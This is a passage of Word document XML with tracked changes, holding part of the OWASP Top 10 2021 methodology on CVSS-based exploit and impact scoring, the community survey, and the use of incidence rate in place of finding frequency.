    <w:p w14:paraId="42585976" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="92" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="93" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00AC649A">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## How </w:t>
        </w:r>
      </w:moveTo>
      <w:moveToRangeEnd w:id="91"/>
      <w:ins w:id="94" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>the data is used for selecting categories</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="526CD863" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="95" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34B6239C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="96" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="97" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>In 2017, we selected categories by incidence rate to determine likelihood, then ranked them by team discussion based on decades of experience for *Exploitability*, *Detectability* (also *likelihood*), and *Technical Impact*. For 2021, we want to use data for *Exploitability* and *(Technical) Impact* if possible.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4A80E2C0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="98" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D87B9BD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="99" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="100" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>We downloaded OWASP Dependency Check and extracted the CVSS Exploit, and Impact scores grouped by related CWEs. It took a fair bit of research and effort as all the CVEs have CVSSv2 scores, but there are flaws in CVSSv2 that CVSSv3 should address. After a certain point in time, all CVEs are assigned a CVSSv3 score as well. Additionally, the scoring ranges and formulas were updated between CVSSv2 and CVSSv3.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6AED6744" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="101" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="309F9337" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="102" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="103" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>In CVSSv2, both *Exploit* and *(Technical) Impact* could be up to 10.0, but the formula would knock them down to 60% for *Exploit* and 40% for *Impact*. In CVSSv3, the theoretical max was limited to 6.0 for *Exploit* and 4.0 for *Impact*. With the weighting considered, the Impact scoring shifted higher, almost a point and a half on average in CVSSv3, and exploitability moved nearly half a point lower on average.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="74DF7407" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="104" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B732296" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="105" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="106" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>There are 125k records of a CVE mapped to a CWE in the National Vulnerability Database (NVD) data extracted from OWASP Dependency Check, and there are 241 unique CWEs mapped to a CVE. 62k CWE maps have a CVSSv3 score, which is approximately half of the population in the data set.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4B0299A7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="107" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DCD683F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="108" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="109" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>For the Top Ten 2021, we calculated average *exploit* and *impact* scores in the following manner. We grouped all the CVEs with CVSS scores by CWE and weighted both *exploit* and *impact* scored by the percentage of the population that had CVSSv3 + the remaining population of CVSSv2 scores to get an overall average. We mapped these averages to the CWEs in the dataset to use as *Exploit* and *(Technical) Impact* scoring for the other half of the risk equation.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0C2504CB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="110" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0335934D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="111" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="112" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Why not just pure statistical data?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3960A340" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="113" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B63A385" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="114" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="115" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">The results in the data are primarily limited to what we can test for in an automated fashion. Talk to a seasoned AppSec professional, and they will tell you about stuff they find and trends they see that aren't yet in the data. It takes time for people to develop testing methodologies for certain vulnerability types and then more time for those tests to be automated and run against a large population of applications. </w:t>
        </w:r>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>Everything we find is looking back in the past and might be missing trends from the last year, which are not present in the data.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="48850AEB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="116" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3300BEE6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="117" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="118" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Therefore, we only pick eight of ten categories from the data because it's incomplete. The other two categories are from the Top 10 community survey. It allows the practitioners on the front lines to vote for what they see as the highest risks that might not be in the data (and may never be expressed in data).</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3EA85C1D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="119" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BE2A737" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="120" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="121" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Why incidence rate instead of frequency</w:t>
        </w:r>
      </w:ins>
      <w:moveToRangeStart w:id="122" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923161"/>
      <w:moveTo w:id="123" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>?</w:t>
        </w:r>
      </w:moveTo>
    </w:p>
    <w:p w14:paraId="2135CB4A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="124" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27C49559" w14:textId="0D85C6BC" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="125" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="126" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">There are three </w:t>
        </w:r>
      </w:moveTo>
      <w:moveToRangeEnd w:id="122"/>
      <w:del w:id="127" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00627CCE" w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>, possibly the largest amount of data ever assembled in the preparation of an application security standard. This provides us with confidence that the new OWASP Top 10 addresses the most impactful application security risks currently facing</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="128" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>primary sources of data. We identify them as Human-assisted Tooling (</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>HaT</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>), Tool-assisted Human (</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>TaH</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>), and raw Tooling.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3BA24B67" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="129" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C33809D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="130" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="131" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">Tooling and </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>HaT</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> are high-frequency finding generators. Tools will look for specific vulnerabilities and tirelessly attempt to find every instance of that vulnerability and will generate high finding counts for some vulnerability types. Look at Cross-Site Scripting, which is typically one of two flavors: it's either a more minor, isolated mistake or a systemic issue. When it's a systemic issue, the finding counts can be in the thousands for a single application. This high frequency drowns out most other vulnerabilities found in reports or data.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3ED9EAD7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="132" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="491311D9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="133" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="134" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>TaH</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>, on the other hand, will find a broader range of vulnerability types but at a much lower frequency due to time constraints. When humans test an application and see something like Cross-Site Scripting, they will typically find three or four instances and stop. They can determine a systemic finding and write it up with a recommendation to fix on an application-wide scale. There is no need (or time) to find every instance.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7BA08034" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="135" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57634AF1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="136" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="137" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">Suppose we take these two distinct data sets and try to merge them on frequency. In that case, the Tooling and </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>HaT</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> data will drown the more accurate (but broad) </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>TaH</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> data and is a good part of why something like Cross-Site Scripting has been so highly ranked in many lists when the impact is generally low to moderate. It's because of the sheer volume of findings. (Cross-Site Scripting is also reasonably easy to test for, so there are many more tests for it as well).</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="173EE9BA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="138" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="639946CE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="139" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="140" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">In 2017, we introduced using incidence rate instead to take a fresh look at the data and cleanly merge Tooling and </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>HaT</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> data with </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>TaH</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> data. The incidence rate asks what percentage of the application population had at least one instance of a vulnerability type. We don't care if it was one-off or systemic. That's irrelevant for our purposes; we just need to know how many applications had at least one instance, which helps provide a clearer view of the testing is findings across multiple testing types without drowning the data in high-frequency results. This corresponds to a risk related view as an attacker needs only one instance to attack an application successfully via the category.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0A3E3C8F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="141" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10A5E6C2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
